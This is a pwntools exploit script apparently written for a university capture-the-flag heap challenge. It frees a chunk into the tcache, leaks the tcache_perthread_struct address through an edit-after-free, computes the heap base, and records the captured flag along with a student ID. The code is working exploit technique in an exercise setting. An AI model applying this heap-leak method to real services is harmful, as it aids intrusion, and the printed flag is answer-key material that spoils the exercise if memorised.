from pwn import *

# context.log_level = 'debug'
# context.terminal = ['tmux', 'splitw', '-h', '-f']

CHALLENGE = "./thread_and_needle"
URL = "offsec-chalbroker.osiris.cyber.nyu.edu"
PORT = 1211
NETID = b"xz4344"
LOCAL = False

if LOCAL:
    p = process(CHALLENGE)
else:
    p = remote(URL, PORT)
    p.recvuntil(b"NetID (something like abc123): ")
    p.sendline(NETID)

# p = gdb.debug(CHALLENGE, '''
#     b *(main+277)
#     b *(main+289)
#     b *(main+301)
#     continue
# ''')

def setup(item, length, type):
    print(p.recvuntil(b"> ").decode())
    p.send(b"1")
    print(p.recvuntil(b"> ").decode())
    p.send(item.encode())
    print(p.recvuntil(b"> ").decode())
    p.send(str(length).encode())
    print(p.recvuntil(b"> ").decode())
    p.send(type.encode())
    log.info(f"Setting up a sewing machine with item: {item}, length: {length}, type: {type}")

def edit(item, length, type):
    print(p.recvuntil(b"> ").decode())
    p.send(b"2")
    print(p.recvuntil(b"> ").decode())
    p.send(b"2")
    print(p.recvuntil(b": ").decode())
    tcache_perthread_struct_addr = int(p.recv(12), 16)
    log.info(f"Receiving leaked tcache_perthread_struct address: {hex(tcache_perthread_struct_addr)}")
    print(p.recvuntil(b"> ").decode())
    p.send(item.encode())
    print(p.recvuntil(b"> ").decode())
    p.send(str(length).encode())
    print(p.recvuntil(b"> ").decode())
    p.send(type.encode())
    log.info(f"Editing the setup with item: {item}, length: {length}, type: {type}")
    return tcache_perthread_struct_addr

def make():
    print(p.recvuntil(b"> ").decode())
    p.send(b"3")
    log.info("Making the item")

def guess(heap_base_addr):
    print(p.recvuntil(b"?\n").decode())
    p.send(str(heap_base_addr).encode())
    log.info(f"Sending heap base address: {hex(heap_base_addr)}")

# Stage 1: Allocate the setting of size 0x18 (heap chunk of size 0x20)
setup("dress", 50, "ladder")
guess(0)

# Stage 2: Free the setting to the tcachebins
make()
guess(0)

# Stage 3: Edit the setting to leak the tcache_perthread_struct address
tcache_perthread_struct_addr = edit("quilt", 20, "blindhem")

# Stage 4: Calculate the heap base address and guess it
heap_base_addr = tcache_perthread_struct_addr & 0xfffffffffffff000
guess(heap_base_addr)

p.interactive()

# flag{Sew1ng_2gethr_3xpl017s!_a8a6c6633e0ddabe}
